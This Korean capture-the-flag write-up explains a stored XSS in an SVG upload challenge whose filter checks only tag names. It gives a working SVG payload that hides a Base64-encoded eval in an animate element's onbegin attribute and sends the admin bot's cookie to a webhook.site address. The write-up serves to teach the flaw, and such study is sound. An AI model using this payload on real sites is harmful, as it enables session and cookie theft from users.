# Antigravity

### 1. VM에 접속한다

문제 페이지에 접속하면 SVG 파일을 업로드하는 `Upload SVG` 버튼과 SVG가 표시되는 화면이 나온다.

### 2. 코드 분석 — SVG XSS가 실행되는 과정

**① `app.py`에서 업로드한 파일을 저장하고 Selenium을 실행한다.**

```python
file.save(file_path)
read_file(unique_filename)
```

**② Selenium은 FLAG를 쿠키로 설정하고 업로드된 SVG를 열어본다.**

```python
cookie = {"name": "flag", "value": FLAG}
cookie.update({"domain": "127.0.0.1"})

driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)
driver.get(f"http://127.0.0.1:8000/?file=uploads/{filename}")
```

따라서 SVG에서 JavaScript가 실행되면 Selenium 브라우저의 `document.cookie`로 FLAG를 읽을 수 있다.

**③ `static/main.py`에서는 SVG 태그 이름만 검사한다.**

```python
allowed_elements = [
    "svg", "path", "rect", "circle",  # ...
    "animate", "animateMotion", "animateTransform",  # ...
]

for element in elements:
    if element.tagName not in allowed_elements:
        raise ValueError(f"Disallowed SVG element found: {element.tagName}")
```

`<script>`는 차단되지만 `<animate>`는 허용된다. `onbegin` 같은 **이벤트 속성은 검사하지 않는다.**

**④ 검사한 SVG를 HTML에 그대로 삽입한다.**

```python
original_svg_content.innerHTML = svg_content
```

`<animate>`의 `onbegin`은 애니메이션 시작 시 실행되는 이벤트 속성이므로, 이 부분에서 XSS가 발생할 수 있다.

### 3. SVG XSS 페이로드 작성

다음 내용을 `.svg` 파일로 저장한다.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <animate
    attributeName="x"
    dur="0s"
    onbegin="eval(atob('bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93ZWJob29rLnNpdGUvNjM3OTQxOGItNmY5My00NzA0LWE4NDgtY2RlMTFjMWI1Zjk4P2ZsYWc9Ii5jb25jYXQoZG9jdW1lbnQuY29va2llKQ=='))"
  />
</svg>
```

`atob()`로 Base64를 디코딩하고 `eval()`로 실행한다. 디코딩된 코드는 다음과 같다.

```javascript
location.href = "https://webhook.site/6379418b-6f93-4704-a848-cde11c1b5f98?flag="
  .concat(document.cookie);
```

`document.cookie`로 FLAG를 읽고, `location.href`로 Webhook.site에 쿠키 값을 담은 GET 요청을 보낸다.

### 4. SVG 파일 업로드

작성한 SVG를 `Upload SVG`로 업로드한다. 서버가 파일을 저장한 뒤 Selenium이 해당 SVG를 열면 `onbegin` 이벤트로 JavaScript가 실행된다.

업로드 후 내 브라우저에서 404가 떠도, Selenium은 UUID가 붙은 실제 저장 파일명으로 접근하므로 XSS 실행과는 별개다.

### 5. Webhook.site에서 FLAG 확인

Webhook.site에서 도착한 GET 요청의 `Query strings`를 확인한다.

```text
flag = flag=DH{...}
```

Selenium의 FLAG 쿠키가 전송된 것이므로 `DH{...}` 부분을 제출한다.

**취약점 원인:** SVG의 태그 이름만 검사하고 이벤트 속성은 검사하지 않은 채 `innerHTML`로 삽입하여 Stored XSS가 발생한다.
